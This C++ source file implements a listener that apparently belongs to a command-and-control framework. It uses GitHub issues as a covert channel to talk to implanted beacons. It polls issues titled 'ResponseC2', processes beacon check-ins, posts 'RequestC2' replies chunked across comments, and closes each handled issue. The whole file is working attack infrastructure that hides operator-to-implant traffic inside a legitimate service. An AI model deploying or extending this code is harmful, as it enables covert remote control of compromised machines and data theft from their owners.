#include "ListenerGithub.hpp"

using namespace std;
using namespace httplib;
using json = nlohmann::json;


ListenerGithub::ListenerGithub(const std::string& project, const std::string& token)
	: Listener(project, token, ListenerGithubType)
	, m_project(project)
	, m_token(token)
{	
	m_listenerHash = random_string(SizeListenerHash);
	m_listenerHash += '\x60';
	m_listenerHash += ListenerGithubType;
	m_listenerHash += '\x60';
	m_listenerHash += project;
	m_listenerHash += '\x60';
	m_listenerHash += token.substr(0,10);

	m_isRunning=true;
	this->m_githubFetcher = std::make_unique<std::thread>(&ListenerGithub::checkGithubIssues, this);
}


ListenerGithub::~ListenerGithub()
{
	m_isRunning=false;
	m_githubFetcher->join();
}


void ListenerGithub::checkGithubIssues()
{
	while(m_isRunning)
	{
		std::string url = "https://api.github.com";
		httplib::Client cli(url);

		std::string token = "token ";
		token+=m_token;

		httplib::Headers headers = {
			{ "Accept", "application/vnd.github+json" },
			{ "Authorization", token },
			{ "Cookie", "logged_in=no" }
		};

		// get list of issues
		std::string endpoint = "/repos/";
		endpoint += m_project;	
		endpoint += "/issues";	
		auto response = cli.Get(endpoint, headers);

		auto err = response.error();
		if(err!=httplib::Error::Success)
		{
			SPDLOG_ERROR("Http client Get {0}", httplib::to_string(err));
			continue;
		}

		if(response->status!=200 && response->status!=201)
		{
			SPDLOG_ERROR("Error with the ListenerGithub: {0}", response->body);
			continue;
		}

		if(!response->body.empty())
		{
			nlohmann::json my_json = json::parse(response->body);

			// for every issue in the list
			for (nlohmann::json::iterator it = my_json.begin(); it != my_json.end(); ++it)
			{				
				std::string title = (*it)["title"];
				std::string body = (*it)["body"];
				int number = (*it)["number"];
				int nbComments = (*it)["comments"];

				if(nbComments!=0)
				{
					SPDLOG_DEBUG("Issue with comments: {0}", std::to_string(number));
				}

				SPDLOG_TRACE("[+] handle issue: {0}", std::to_string(number));

				if(title.rfind("ResponseC2: ", 0) == 0)
				{	
					std::string marker = "ResponseC2: ";
					std::size_t pos = title.find(marker);
					if (pos == std::string::npos) 
					{
						continue;
					}
					pos += marker.length();
					std::string beaconHash = title.substr(pos);

					std::string res;
					HandleCheckIn(body, res);

					// generate the response for response who got content 
					if(res.size()>4)
					{
						std::string reponseTitle = "RequestC2: ";   
						reponseTitle+=beaconHash;

						// body too long need to split it
						int maxChunkSize = 65000;
						if(res.size()>=maxChunkSize)
						{
							SPDLOG_DEBUG("Split response");
							std::vector<std::string> chunks;
							for (std::size_t i = 0; i < res.size(); i += maxChunkSize) 
							{
								chunks.push_back(res.substr(i, maxChunkSize));
							}

							SPDLOG_DEBUG("Split response of {0} chunks", chunks.size());

							nlohmann::json responseData = {
							{"title", reponseTitle},
							{"body", chunks[0]},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							err = response.error();
							if(err!=httplib::Error::Success)
							{
								SPDLOG_ERROR("Http client Post Issue {0}", httplib::to_string(err));
								continue;
							}

							SPDLOG_TRACE("Issue created {0}", response->status);
							
							if(response->status!=200 && response->status!=201)
							{
								SPDLOG_ERROR("Error with the ListenerGithub: {0}", response->body);
								continue;
							}

							nlohmann::json my_json = nlohmann::json::parse(response->body);
							int number = my_json["number"];
		
							for (std::size_t i = 1; i < chunks.size(); i++) 
							{
								nlohmann::json responseData = {
									{"body", chunks[i]},
									};

								std::string data = responseData.dump();

								std::string contentType = "application/json";
								std::string issueEndpoint = "/repos/";
								issueEndpoint += m_project;	
								issueEndpoint += "/issues/";
								issueEndpoint += std::to_string(number);	
								issueEndpoint += "/comments";
								auto response = cli.Post(issueEndpoint, headers, data, contentType);

								err = response.error();
								if(err!=httplib::Error::Success)
								{
									SPDLOG_ERROR("Http client Post Comments {0}", httplib::to_string(err));
									continue;
								}

								if(response->status!=200 && response->status!=201)
								{
									SPDLOG_ERROR("Error with the ListenerGithub: {0}", response->body);
									continue;
								}
							}
						}
						else
						{
							SPDLOG_DEBUG("Simple reponse");

							nlohmann::json responseData = {
							{"title", reponseTitle},
							{"body", res},
							};

							std::string data = responseData.dump();

							std::string contentType = "application/json";
							auto response = cli.Post(endpoint, headers, data, contentType);

							err = response.error();
							if(err!=httplib::Error::Success)
							{
								SPDLOG_ERROR("Http client Post {0}", httplib::to_string(err));
								continue;
							}

							if(response->status!=200 && response->status!=201)
							{
								SPDLOG_ERROR("Error with the ListenerGithub: {0}", response->body);
								continue;
							}
						}
					}

					std::string data = "{\"state\":\"closed\"}";
					std::string contentType = "application/json";

					// close the issue
					std::string issueEndpoint = "/repos/";
					issueEndpoint += m_project;	
					issueEndpoint += "/issues/";
					issueEndpoint += std::to_string(number);	
					auto response = cli.Post(issueEndpoint, headers, data, contentType);

					err = response.error();
					if(err!=httplib::Error::Success)
					{
						SPDLOG_ERROR("Http client Post close {0}", httplib::to_string(err));
						continue;
					}
				}
			}
		}	

		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	}
}


int ListenerGithub::HandleCheckIn(const std::string& req, std::string& output)
{
	SPDLOG_TRACE("HandleCheckIn");

	try
	{
    	bool ret = handleMessages(req, output);
	} 
	catch (const std::exception& ex) 
	{
		SPDLOG_ERROR("HandleCheckIn catch exception");
	} 
	catch (...) 
	{
		SPDLOG_ERROR("HandleCheckIn catch...");
	}

	

	return 0;
}
